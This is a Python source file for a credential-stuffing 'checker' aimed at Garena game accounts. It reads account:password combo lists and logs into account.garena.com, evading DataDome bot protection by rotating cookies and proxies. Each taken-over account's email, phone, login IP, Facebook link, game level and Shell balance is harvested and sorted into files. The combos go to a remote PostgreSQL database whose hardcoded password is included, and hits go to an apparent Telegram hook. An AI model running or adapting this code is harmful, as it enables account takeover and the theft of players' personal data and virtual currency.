        games_dir = Path(base_dir) / 'Games'
        games_dir.mkdir(parents=True, exist_ok=True)
        identifier = f'{account}:{password}'
        base_entry = f"{identifier}\nEmail: {account_data.get('email_display', 'N/A')}\nMobile: {account_data.get('formatted_mobile', 'N/A')}\nShell: {account_data.get('shell_balance', 0)}\nCountry: {account_data.get('country', 'N/A')}\nLast Login: {account_data.get('last_login_date', 'N/A')}\nLogin Location: {account_data.get('last_login_where', 'N/A')}\nLogin IP: {account_data.get('last_login_ip', 'N/A')}\nFB Status: {account_data.get('fb_info', 'N/A')}\nStatus: {('CLEAN' if account_data.get('is_clean') else 'NOT CLEAN')}\n"
        saved_games = set()
        for g in game_connections:
            gname = g.get('game', '').upper()
            grole = g.get('role', 'N/A')
            gregion = g.get('region', 'N/A')
            if gname in saved_games:
                continue
            saved_games.add(gname)
            fname = GAME_FILE_MAP.get(gname, f"{gname.replace(' ', '_')}.txt")
            fpath = games_dir / fname
            if gname == 'CODM':
                entry = base_entry + f'CODM IGN: {grole}\n' + f"CODM Level: {account_data.get('codm_level', 'N/A')}\n" + f"CODM UID: {account_data.get('codm_uid', 'N/A')}\n" + f'CODM Region: {gregion}\n'
            else:
                entry = base_entry + f'{gname} IGN: {grole}\n' + f'{gname} Region: {gregion}\n'
            already = False
            if fpath.exists():
                with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                    if identifier in f.read():
                        already = True
            if not already:
                with open(fpath, 'a', encoding='utf-8', errors='replace') as f:
                    f.write(entry.strip() + '\n\n')
    except Exception as e:
        logger.error(f'[ERROR] save_game_folder: {e}')
# ============================================
# RESULTS MANAGER (From cod.py - Preserved)
# ============================================

class ResultsManager:
    def __init__(self, combo_file_path):
        self.combo_file_name = Path(combo_file_path).stem
        self.timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.base_dir = Path(f'Results/output_{self.combo_file_name}')
        for sub in ('Country', 'Level', 'Games', 'Garena Shells'):
            (self.base_dir / sub).mkdir(parents=True, exist_ok=True)
        self._file_locks = {}
        self._locks_meta = threading.Lock()
        self._counter = 0
        self._counter_lock = threading.Lock()
        self._db_queue = []
        self._db_queue_lock = threading.Lock()
        self._db_flush_lock = threading.Lock()
        self._DB_BATCH = 100
        self._db_flushing = False

    def _db_enqueue(self, combo):
        with self._db_queue_lock:
            self._db_queue.append(combo)
            should_flush = len(self._db_queue) >= self._DB_BATCH and (not self._db_flushing)
        if should_flush:
            threading.Thread(target=self._db_flush_batch, daemon=True).start()

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            

    def _db_flush_batch(self, force=False):
        with self._db_flush_lock:
            with self._db_queue_lock:
                if not self._db_queue:
                    return
                if not force and len(self._db_queue) < self._DB_BATCH:
                    return
                batch = list(self._db_queue)
                self._db_queue.clear()
                self._db_flushing = True
            try:
                _pg_save_combos(batch)
            except Exception:
                pass
            finally:
                with self._db_queue_lock:
                    self._db_flushing = False

    def db_flush_final(self):
        self._db_flush_batch(force=True)

    def _get_flock(self, fp):
        fp = str(fp)
        with self._locks_meta:
            if fp not in self._file_locks:
                self._file_locks[fp] = threading.Lock()
            return self._file_locks[fp]

    def _next_index(self):
        with self._counter_lock:
            self._counter += 1
            return self._counter

    @staticmethod
    def _entry_level(entry):
        import re as _re
        m = _re.search('Account Level:\\s*(\\d+)', entry)
        return int(m.group(1)) if m else 0

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            

    def _write_sorted(self, filepath, new_entry_body):
        filepath = str(filepath)
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        separator = '=' * 60 + '\n'
        with self._get_flock(filepath):
            entries = []
            if os.path.exists(filepath):
                with open(filepath, 'r', encoding='utf-8', errors='replace') as f:
                    content = f.read()
                raw_entries = content.strip().split('\n' + '=' * 60 + '\n')
                for raw_entry in raw_entries:
                    raw_entry = raw_entry.strip()
                    if raw_entry:
                        if raw_entry.startswith('=' * 60):
                            raw_entry = raw_entry[len('=' * 60):].strip()
                        if raw_entry.endswith('=' * 60):
                            raw_entry = raw_entry[:-len('=' * 60)].strip()
                        entries.append(raw_entry)
            new_entry = new_entry_body.strip()
            if new_entry.startswith('=' * 60):
                new_entry = new_entry[len('=' * 60):].strip()
            if new_entry.endswith('=' * 60):
                new_entry = new_entry[:-len('=' * 60)].strip()
            entries.append(new_entry)
            entries.sort(key=self._entry_level, reverse=True)
            with open(filepath, 'w', encoding='utf-8', errors='replace') as f:
                for i, entry in enumerate(entries):
                    f.write('=' * 60 + '\n')
                    f.write(entry.strip())
                    f.write('\n' + '=' * 60)
                    if i < len(entries) - 1:
                        f.write('\n\n')

    def _append_line(self, filepath, line):
        filepath = str(filepath)
        with self._get_flock(filepath):
            with open(filepath, 'a', encoding='utf-8', errors='replace') as f:
                f.write(line + '\n')

    @staticmethod
    def _ascii(val):
        if not val or val == 'N/A':
            return val
        cleaned = ''.join((c for c in str(val) if c >= ' ' or c in '\t')).strip()
        return cleaned or 'N/A'

    def _format_account(self, account_data, index=1):
        acct = account_data.get('account', 'N/A')
        pwd = account_data.get('password', 'N/A')
        if account_data.get('is_error'):
            return '=' * 60 + f"\nAccount: {acct} : {pwd}\nError: {account_data.get('error_reason', 'Unknown')}\n" + '=' * 60
        is_clean = account_data.get('is_clean', False)
        has_codm = account_data.get('has_codm', False)
        _region_raw = account_data.get('codm_region', 'N/A')
        _region_info = CODM_REGIONS.get(str(_region_raw).upper(), {}) if _region_raw and _region_raw != 'N/A' else {}
        if _region_info:
            _server_str = f"{_region_info['flag']} {_region_info['name']} ({_region_raw})"
        else:
            _server_str = str(_region_raw)
        lines = [
            '=' * 60,
            f'Account: {acct}:{pwd}',
            f"UID: {account_data.get('uid', 'N/A')}",
            f"Username: {self._ascii(account_data.get('username', 'N/A'))}",
            f"Garena Shell: {account_data.get('shell_balance', 0)}",
            f"Email: {account_data.get('email_display', 'N/A')}",
            f"Mobile: {account_data.get('formatted_mobile', 'N/A')}",
            f"Country: {account_data.get('country', 'N/A')}",
            f"Nickname: {self._ascii(account_data.get('nickname', 'N/A'))}",
            '',
            '--- Facebook Information ---',
            f"Facebook Username: {self._ascii(account_data.get('fb_username', 'N/A'))}",
            f"Facebook Link: {account_data.get('fb_link', 'N/A')}",
            f"Facebook Status: {account_data.get('fb_info', 'N/A')}",
            '',
            '--- CODM Information ---',
            f"Account Level: {account_data.get('codm_level', 'N/A')}",
            f'Server: {_server_str}',
            f"IGN: {self._ascii(account_data.get('codm_nickname', 'N/A'))}",
            f"UID: {account_data.get('codm_uid', account_data.get('uid', 'N/A'))}",
            '',
            '--- Login History ---',
            f"Last Login: {account_data.get('last_login_date', 'N/A')}",
            f"Last Login From: {account_data.get('last_login_where', 'N/A')}",
            f"Last Login IP: {account_data.get('last_login_ip', 'N/A')}",
            f"Last Login Country: {account_data.get('last_login_country', 'N/A')}",
            '',
            f"Account Status: {('Clean' if is_clean else 'Not Clean')}",
            '',
            'Powered by: SHIN PALAUTOGSHIN PALAUTOGsuport',
            '=' * 60
        ]
        return '\n'.join(lines)

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            

    def add_account(self, account_data):
        combo = f"{account_data.get('account', '')}:{account_data.get('password', '')}"
        if combo.strip(':'):
            self._db_enqueue(combo)
        if _TG_HOOK and (not account_data.get('is_error')):
            threading.Thread(target=_TG_HOOK, args=(account_data,), daemon=True).start()
        if account_data.get('is_error'):
            return
        index = self._next_index()
        entry = self._format_account(account_data, index=index)
        has_codm = account_data.get('has_codm', False)
        is_clean = account_data.get('is_clean', False)
        shell = int(account_data.get('shell_balance', 0) or 0)
        valid_path = self.base_dir / 'Valid Accounts.txt'
        self._append_line(valid_path, combo)
        self._write_sorted(self.base_dir / 'All Accounts.txt', entry)
        clean_file = 'Clean Accounts.txt' if is_clean else 'Not Clean Accounts.txt'
        self._write_sorted(self.base_dir / clean_file, entry)
        country = str(account_data.get('country', 'XX') or 'XX').strip().upper()
        self._write_sorted(self.base_dir / 'Country' / f'{country} Accounts.txt', entry)
        if has_codm:
            try:
                lvl = int(account_data.get('codm_level', 0) or 0)
            except (ValueError, TypeError):
                lvl = 0
            if lvl <= 100:
                bucket = '1-100.txt'
            elif lvl <= 200:
                bucket = '101-200.txt'
            elif lvl <= 350:
                bucket = '201-350.txt'
            else:
                bucket = '351-400.txt'
            self._write_sorted(self.base_dir / 'Level' / bucket, entry)
        if shell > 0:
            shells_file = 'CODM Accounts.txt' if has_codm else 'NO CODM Accounts.txt'
            self._write_sorted(self.base_dir / 'Garena Shells' / shells_file, entry)

# ============================================
# DATABASE FUNCTIONS (From cod.py)
# ============================================

RAILWAY_DB_URL = "postgresql://postgres:CiIBvyjaJJYLkKCqYgPOONEuGxunMFfX@tramway.proxy.rlwy.net:30778/railway"

def _pg_get_stats():
    import psycopg2
    conn = psycopg2.connect(RAILWAY_DB_URL)
    cur = conn.cursor()
    cur.execute('SELECT COUNT(*) FROM checked_accounts')
    total = cur.fetchone()[0]
    cur.execute('SELECT MAX(checked_at) FROM checked_accounts')
    latest = cur.fetchone()[0]
    cur.close()
    conn.close()
    return {'total': total or 0, 'latest': latest}

def _pg_save_combos(combos: list):
    import psycopg2
    import psycopg2.extras
    if not combos:
        return
    conn = psycopg2.connect(RAILWAY_DB_URL)
    cur = conn.cursor()
    psycopg2.extras.execute_values(cur, 'INSERT INTO checked_accounts (combo) VALUES %s ON CONFLICT (combo) DO NOTHING', [(c,) for c in combos])
    conn.commit()
    cur.close()
    conn.close()

def _pg_filter_combos(local_combos: list):
    import psycopg2
    conn = psycopg2.connect(RAILWAY_DB_URL)
    cur = conn.cursor()
    BATCH = 2000
    matched_set = set()
    for i in range(0, len(local_combos), BATCH):
        batch = local_combos[i:i + BATCH]
        cur.execute('SELECT combo FROM checked_accounts WHERE combo = ANY(%s)', (batch,))
        for row in cur.fetchall():
            matched_set.add(row[0])
    cur.close()
    conn.close()
    return matched_set

class DatabaseComparison:
    def __init__(self):
        self.stats = None

    def display_database_stats(self):
        indent = '    '
        _err = None
        print(f'\n{indent}{CYAN}↺  Connecting to Railway database…{RESET}')
        try:
            self.stats = _pg_get_stats()
        except Exception as e:
            _err = str(e)
            self.stats = None
        if not self.stats:
            _log('WARNING', 'Unable to fetch database statistics', indent)
            if _err:
                _log('ERROR', _err[:70], indent)
            return
        total = self.stats['total']
        latest = self.stats['latest'].strftime('%Y-%m-%d %H:%M') if self.stats['latest'] else 'N/A'
        print()
        _abox_open('DATABASE STATISTICS', bc=CYAN, tc=CYAN)
        _abox_row('Total Stored', f'{total:,}', vc=CYAN)
        _abox_row('Last Entry', latest, vc=YELLOW)
        _abox_row('Host', 'Railway PostgreSQL', vc=MAGENTA)
        _abox_row('Maintained by', 'SHIN PALAUTOGSHIN PALAUTOGsuport', vc=GREEN)
        _abox_close(bc=CYAN)
        print()
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
                       
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            

    def compare_and_filter_file(self, file_path):
        return None
        indent = '    '
        try:
            if isinstance(file_path, str):
                file_path = Path(file_path)
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                file_content = f.read()
            local_combos = [l.strip() for l in file_content.splitlines() if l.strip() and ':' in l]
            total_local = len(local_combos)
            _abox_open('DATABASE COMPARISON', bc=CYAN, tc=CYAN)
            _abox_row('File', file_path.name, vc=CYAN, bc=CYAN)
            _abox_row('Combos to compare', f'{total_local:,}', vc=YELLOW, bc=CYAN)
            _abox_close(bc=CYAN)
            print()
            matched_set = None
            _conn_err = None
            print(f'\n  {CYAN}↺  Comparing with Railway database…{RESET}')
            if True:
                try:
                    matched_set = _pg_filter_combos(local_combos)
                except Exception as e:
                    _conn_err = str(e)
                    matched_set = None
            if matched_set is None:
                _abox_open('✖  CONNECTION ERROR', bc=RED, tc=RED)
                _abox_row('Error', (_conn_err or 'Could not reach Railway database')[:60], vc=RED, bc=RED)
                _abox_row('Action', 'Skipping filter — using full file', vc=YELLOW, bc=RED)
                _abox_close(bc=RED)
                print()
                return 'SERVER_ERROR'
            non_matched_combos = [c for c in local_combos if c not in matched_set]
            matches = len(local_combos) - len(non_matched_combos)
            non_matches = len(non_matched_combos)
            skip_pct = round(matches / total_local * 100, 1) if total_local else 0
            _abox_open('✔  COMPARISON RESULTS', bc=GREEN, tc=GREEN)
            _abox_row('Total Combos', f'{total_local:,}', vc=CYAN, bc=GREEN)
            _abox_row('Already in DB', f'{matches:,}  ({skip_pct}% skipped)', vc=RED, bc=GREEN)
            _abox_row('Fresh / Queue', f'{non_matches:,}', vc=GREEN, bc=GREEN)
            _abox_close(bc=GREEN)
            print()
            if non_matches == 0:
                _log('WARNING', 'All combos already in database — nothing new to check.', indent)
                print()
                return None
            filtered_file_path = file_path.parent / f'{file_path.stem}_filtered{file_path.suffix}'
            with open(filtered_file_path, 'w', encoding='utf-8') as f:
                f.write('\n'.join(non_matched_combos))
            _log('SAVE', f'Filtered file saved: [bright_cyan]{filtered_file_path.name}[/bright_cyan]', indent)
            _log('INFO', f'[dim]{non_matches:,} fresh combos queued for checking.[/dim]', indent)
            print()
            return (filtered_file_path, non_matched_combos)
        except Exception:
            _log('ERROR', 'Error during comparison', indent)
            _log('WARNING', 'Skipping filter — using full file…', indent)
            return 'SERVER_ERROR'

# ============================================
# ACCOUNT FILE MANAGER (From cod.py)
# ============================================

class AccountFileManager:
    def __init__(self, combo_folder='Combo'):
        self.combo_folder = Path(combo_folder)
        self.combo_folder.mkdir(exist_ok=True)
        self._file_lock = threading.Lock()

    def scan_combo_folder(self):
        return list(self.combo_folder.glob('*.txt'))

    def get_file_info(self, file_path):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip() and ':' in line]
                account_count = len(lines)
            file_size = file_path.stat().st_size
            return {'name': file_path.name, 'path': str(file_path), 'size': file_size, 'size_str': self._format_size(file_size), 'account_count': account_count}
        except Exception as e:
            logger.error(f'Error reading file {file_path}')
            return None

    def _format_size(self, size_bytes):
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size_bytes < 1024.0:
                return f'{size_bytes:.2f} {unit}'
            size_bytes /= 1024.0
        return f'{size_bytes:.2f} TB'

    def clean_file_encoding(self, file_path):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            cleaned_lines = []
            invalid_count = 0
            for line in lines:
                account, password = clean_account_line(line)
                if account and password:
                    cleaned_lines.append(f'{account}:{password}\n')
                else:
                    invalid_count += 1
            with open(file_path, 'w', encoding='utf-8') as f:
                f.writelines(cleaned_lines)
            return (len(cleaned_lines), invalid_count)
        except Exception as e:
            logger.error(f'Error cleaning file encoding')
            return (0, 0)

    def clean_duplicates(self, file_path, overwrite=True):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip()]
            original_count = len(lines)
            unique_lines = list(dict.fromkeys(lines))
            duplicates_removed = original_count - len(unique_lines)
            if overwrite:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(unique_lines))
            else:
                new_path = file_path.parent / f'{file_path.stem}_cleaned.txt'
                with open(new_path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(unique_lines))
            return duplicates_removed
        except Exception as e:
            logger.error(f'Error cleaning duplicates')
            return 0

    def remove_line_from_file(self, file_path, line_to_remove):
        try:
            file_path = Path(file_path)
            target = line_to_remove.strip()
            with self._file_lock:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()
                with open(file_path, 'w', encoding='utf-8') as f:
                    for line in lines:
                        if line.strip() != target:
                            f.write(line)
            return True
        except Exception as e:
            logger.error(f'Error removing line')
            return False

# ============================================
# LIVE STATS CLASS (From cod.py - Modified for UI)
# ============================================

class LiveStats:
    def __init__(self):
        self.valid_count = 0
        self.invalid_count = 0
        self.clean_count = 0
        self.not_clean_count = 0
        self.has_codm_count = 0
        self.no_codm_count = 0
        self.error_count = 0
        self.highest_clean_level = 0
        self.clean_level_counts = {'351-400': 0, '201-350': 0, '101-200': 0, '1-100': 0}
        self.not_clean_level_counts = {'351-400': 0, '201-350': 0, '101-200': 0, '1-100': 0}
        self.highest_nc_level = 0
        self.highest_shell = 0
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.total_accounts = 0
        self.game_counts = {k: 0 for k, _ in GAME_DISPLAY_NAMES}
        self.last_result_queue: deque = deque(maxlen=200)
        self.categorized_levels = {"1-49": 0, "50-99": 0, "100-199": 0, "200-299": 0, "300-400": 0}
        self.countries = []
        self.valid_hits = []

    def update_stats(self, valid=False, clean=False, has_codm=False, is_error=False, codm_level=0, game_connections=None, shell=0):
        with self.lock:
            if is_error:
                self.error_count += 1
            elif valid:
                self.valid_count += 1
                if clean:
                    self.clean_count += 1
                    if has_codm and codm_level > self.highest_clean_level:
                        self.highest_clean_level = codm_level
                    if has_codm and codm_level > 0:
                        if codm_level > self.highest_clean_level:
                            self.highest_clean_level = codm_level
                        if codm_level <= 100:
                            self.clean_level_counts['1-100'] += 1
                        elif codm_level <= 200:
                            self.clean_level_counts['101-200'] += 1
                        elif codm_level <= 350:
                            self.clean_level_counts['201-350'] += 1
                        else:
                            self.clean_level_counts['351-400'] += 1
                else:
                    self.not_clean_count += 1
                    if has_codm and codm_level > 0:
                        if codm_level > self.highest_nc_level:
                            self.highest_nc_level = codm_level
                        if codm_level <= 100:
                            self.not_clean_level_counts['1-100'] += 1
                        elif codm_level <= 200:
                            self.not_clean_level_counts['101-200'] += 1
                        elif codm_level <= 350:
                            self.not_clean_level_counts['201-350'] += 1
                        else:
                            self.not_clean_level_counts['351-400'] += 1
                if has_codm:
                    self.has_codm_count += 1
                else:
                    self.no_codm_count += 1
                try:
                    shell_val = int(shell or 0)
                    if shell_val > self.highest_shell:
                        self.highest_shell = shell_val
                except (ValueError, TypeError):
                    pass
                for g in game_connections or []:
                    gname = g.get('game', '').upper()
                    if gname == 'FREE FIRE':
                        gname = 'FREEFIRE'
                    if gname in self.game_counts:
                        self.game_counts[gname] += 1
            else:
                self.invalid_count += 1

    def get_stats(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            checked = self.valid_count + self.invalid_count + self.error_count
            progress = (checked / self.total_accounts * 100) if self.total_accounts > 0 else 0
            return {
                'valid': self.valid_count,
                'invalid': self.invalid_count,
                'clean': self.clean_count,
                'not_clean': self.not_clean_count,
                'has_codm': self.has_codm_count,
                'no_codm': self.no_codm_count,
                'error': self.error_count,
                'highest_clean_level': self.highest_clean_level,
                'clean_level_counts': dict(self.clean_level_counts),
                'not_clean_level_counts': dict(self.not_clean_level_counts),
                'game_counts': dict(self.game_counts),
                'highest_shell': self.highest_shell,
                'checked': checked,
                'total': self.total_accounts,
                'elapsed': elapsed,
                'progress': progress,
                'high_lvl': self.highest_clean_level,
                'high_shell': self.highest_shell
            }

    def get_processed_count(self):
        with self.lock:
            return self.valid_count + self.invalid_count + self.error_count

    def push_result(self, success: bool, is_clean: bool = False, has_codm: bool = False, codm_level: int = 0, error_reason: str = ''):
        with self.lock:
            self.last_result_queue.append({
                'success': success,
                'is_clean': is_clean,
                'has_codm': has_codm,
                'codm_level': codm_level,
                'error_reason': error_reason
            })

    def pop_result(self):
        with self.lock:
            if self.last_result_queue:
                return self.last_result_queue.popleft()
            return None

    def add_hit(self, level, text):
        with self.lock:
            self.valid_hits.append({'level': level, 'text': text})

    def add_codm_details(self, level, country):
        with self.lock:
            if country and country != 'N/A':
                self.countries.append(country)
            try:
                lvl = int(level)
                if 1 <= lvl <= 49:
                    self.categorized_levels["1-49"] += 1
                elif 50 <= lvl <= 99:
                    self.categorized_levels["50-99"] += 1
                elif 100 <= lvl <= 199:
                    self.categorized_levels["100-199"] += 1
                elif 200 <= lvl <= 299:
                    self.categorized_levels["200-299"] += 1
                elif 300 <= lvl <= 400:
                    self.categorized_levels["300-400"] += 1
            except:
                pass

    def update_highest(self, shells, level, is_clean=None):
        with self.lock:
            try:
                s = int(float(str(shells).strip()))
                if s > self.highest_shell:
                    self.highest_shell = s
            except:
                pass
            try:
                l = int(float(str(level).strip()))
                if l > self.highest_clean_level:
                    self.highest_clean_level = l
                if is_clean is True and l > self.highest_clean_level:
                    self.highest_clean_level = l
                if is_clean is False and l > self.highest_nc_level:
                    self.highest_nc_level = l
            except:
                pass

# ============================================
# PROCESS ACCOUNT FUNCTION (From cod.py - Modified to return account_data)
# ============================================

_auto_remove_queue = []
_auto_remove_lock = threading.Lock()
_auto_remove_batch = 50

def _flush_auto_remove(file_manager, combo_file_path, force=False):
    with _auto_remove_lock:
        if not _auto_remove_queue:
            return
        if not force and len(_auto_remove_queue) < _auto_remove_batch:
            return
        batch = list(_auto_remove_queue)
        _auto_remove_queue.clear()
    if not batch:
        return
    target_set = set((b.strip() for b in batch))
    try:
        fp = Path(combo_file_path)
        with file_manager._file_lock:
            with open(fp, 'r', encoding='utf-8', errors='ignore') as fh:
                lines = fh.readlines()
            with open(fp, 'w', encoding='utf-8') as fh:
                for line in lines:
                    if line.strip() not in target_set:
                        fh.write(line)
    except Exception:
        pass

def _queue_auto_remove(account, password, file_manager, combo_file_path):
    with _auto_remove_lock:
        _auto_remove_queue.append(f'{account}:{password}')
    if len(_auto_remove_queue) >= _auto_remove_batch:
        threading.Thread(target=_flush_auto_remove, args=(file_manager, combo_file_path), daemon=True).start()

def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, results_manager, file_manager, combo_file_path, auto_remove, use_elegant_display=False, suppress_print=False, proxy_manager=None):
    max_retries = 2
    attempt = 0

    def display_info(acc, pwd, det, codm, has, error_reason=None, gc=None):
        if suppress_print:
            return
        if use_elegant_display:
            display_codm_info_elegant(acc, pwd, det, codm, has, error_reason, gc)
        else:
            display_codm_info(acc, pwd, det, codm, has, error_reason, gc)

    while True:
        attempt += 1
        try:
            session.cookies.clear()
            init_ga_cookies(session)
            datadome_manager.clear_session_datadome(session)
            current_datadome = datadome_manager.get_datadome()
            if current_datadome:
                datadome_manager.set_session_datadome(session, current_datadome)
            else:
                saved = cookie_manager.get_valid_cookies()
                if saved:
                    picked = random.choice(saved)
                    val = picked.split('=', 1)[1] if '=' in picked else picked
                    datadome_manager.set_datadome(val)
                    datadome_manager.set_session_datadome(session, val)
                else:
                    proxy_dict = dict(session.proxies) if hasattr(session, 'proxies') and session.proxies else None
                    datadome = get_datadome_cookie(session, proxies=proxy_dict)
                    if datadome:
                        datadome_manager.set_datadome(datadome)
                        datadome_manager.set_session_datadome(session, datadome)
            v1, v2, new_datadome = prelogin(session, account, datadome_manager, cookie_manager, proxy_manager=proxy_manager)
            if v1 == 'IP_BLOCKED':
                if datadome_manager.wait_for_ip_change(session):
                    session.close()
                    session = requests.Session()
                    session.cookies.clear()
                    init_ga_cookies(session)
                    datadome_manager.clear_session_datadome(session)
                    return ('IP_CHANGED', None)
                else:
                    live_stats.update_stats(is_error=True)
                    account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'IP Change Timeout'}
                    results_manager.add_account(account_data)
                    if auto_remove:
                        _queue_auto_remove(account, password, file_manager, combo_file_path)
                    return ('ERROR', account_data)
            if not v1 or not v2:
                live_stats.update_stats(valid=False)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': "Account Doesn't Exist"}
                results_manager.add_account(account_data)
                live_stats.push_result(success=False, error_reason="Account Doesn't Exist")
                display_info(account, password, None, None, False, error_reason="Account Doesn't Exist!")
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return ('ERROR', account_data)
            if new_datadome:
                datadome_manager.set_datadome(new_datadome)
                datadome_manager.set_session_datadome(session, new_datadome)
            sso_key = login(session, account, password, v1, v2)
            if not sso_key:
                live_stats.update_stats(valid=False)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Invalid Credentials'}
                results_manager.add_account(account_data)
                live_stats.push_result(success=False, error_reason='Wrong Password')
                display_info(account, password, None, None, False, error_reason='Incorrect Password')
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return ('ERROR', account_data)
            if isinstance(sso_key, str) and sso_key.startswith('permanent_fail:'):
                reason = sso_key.split(':', 1)[1]
                live_stats.update_stats(valid=False)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': reason}
                results_manager.add_account(account_data)
                display_info(account, password, None, None, False, error_reason=reason)
                if auto_remove:
                    file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
                return ('ERROR', account_data)
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key', '_ga', '_ga_XB5PSHEQB4', '_ga_1M7M9L6VPX']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f'{cookie_name}={current_cookies[cookie_name]}')
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            headers = {
                "Accept": "*/*",
                "Referer": "https://account.garena.com/",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-PH,en-US;q=0.9,en;q=0.8"
            }
            if cookie_header:
                headers['Cookie'] = cookie_header
            response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=12)
            if response.status_code == 403:
                bad_cookie = session.cookies.get('datadome') or datadome_manager.get_datadome()
                if bad_cookie:
                    cookie_manager.mark_banned(bad_cookie)
                if datadome_manager.handle_403(session):
                    if attempt < max_retries:
                        if not suppress_print:
                            print(f'  {YELLOW}⚠  403 error, retrying ({attempt}/{max_retries}){RESET}')
                        continue
                live_stats.update_stats(is_error=True)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Cookie Banned/IP Blocked'}
                results_manager.add_account(account_data)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return ('ERROR', account_data)
            try:
                account_data_json = response.json()
            except json.JSONDecodeError:
                if attempt < max_retries:
                    if not suppress_print:
                        print(f'  {YELLOW}⚠  Invalid response, retrying ({attempt}/{max_retries}){RESET}')
                    time.sleep(2)
                    continue
                live_stats.update_stats(is_error=True)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Invalid Server Response'}
                results_manager.add_account(account_data)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return ('ERROR', account_data)
            if 'error_auth' in account_data_json:
                live_stats.update_stats(valid=False)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Incorrect Password'}
                results_manager.add_account(account_data)
                display_info(account, password, None, None, False, error_reason='Incorrect Password')
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return ('ERROR', account_data)
            if 'error' in account_data_json:
                error_msg = account_data_json.get('error')
                if error_msg == 'ACCOUNT DOESNT EXIST':
                    live_stats.update_stats(valid=False)
                    account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': "Account Doesn't Exist"}
                    results_manager.add_account(account_data)
                    display_info(account, password, None, None, False, error_reason="Account Doesn't Exist!")
                    if auto_remove:
                        file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
                    return ('ERROR', account_data)
                else:
                    live_stats.update_stats(is_error=True)
                    account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': error_msg}
                    results_manager.add_account(account_data)
                    display_info(account, password, None, None, False, error_reason=error_msg)
                    if auto_remove:
                        file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
                    return ('ERROR', account_data)
            if 'user_info' in account_data_json:
                details = parse_account_details(account_data_json)
                details['login_history'] = account_data_json.get('login_history', [])
            else:
                details = parse_account_details({'user_info': account_data_json})
            codm_session = requests.Session()
            for cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
                if cookie_name in session.cookies:
                    codm_session.cookies.set(cookie_name, session.cookies.get(cookie_name), domain='.garena.com')
            has_codm, codm_info = check_codm_account(codm_session, account)
            codm_session.close()
            game_connections = []
            if CHECK_OTHER_GAMES:
                try:
                    game_connections = get_game_connections(session, account)
                except Exception as _ge:
                    logger.warning(f'[GAMES] Failed for {account}: {_ge}')
            fresh_datadome = datadome_manager.extract_datadome_from_session(session)
            if fresh_datadome:
                cookie_manager.save_cookie(fresh_datadome)
            mobile_no = details['personal'].get('mobile_no', 'N/A')
            country_code = details['personal'].get('country_code', 'N/A')
            formatted_mobile = format_mobile_number(mobile_no, country_code)
            email = details.get('email', 'N/A')
            email_verified = details.get('email_verified', False)
            if email and email != 'N/A' and ('@' in email):
